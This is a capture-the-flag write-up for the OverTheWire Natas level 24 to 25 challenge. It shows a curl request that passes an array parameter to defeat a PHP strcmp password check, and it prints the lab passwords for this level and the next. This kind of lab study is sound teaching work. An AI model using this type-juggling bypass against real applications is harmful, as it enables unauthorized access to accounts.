# Natas Level 24 to 25

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 24 -> 25 |
| Status | Complete |

## Objective

Bypass a `strcmp` password check.

## Given Access

User: `natas24`

Password:

```text
MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
```

## Method

The app calls `strcmp($_REQUEST["passwd"], "<censored>")` and checks `!strcmp(...)`. Supplying `passwd[]` makes PHP pass an array to `strcmp`, producing a warning and a falsey return value that satisfies the negation in this challenge environment.

## Commands

```bash
curl -s -u natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd \
  'http://natas24.natas.labs.overthewire.org/?passwd[]=x'
```

## Result

Password for `natas25`:

```text
ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
```

## Lesson

Validate input types before comparison. In PHP, request parameters can be arrays when named with `[]`.

## References

- https://overthewire.org/wargames/natas/
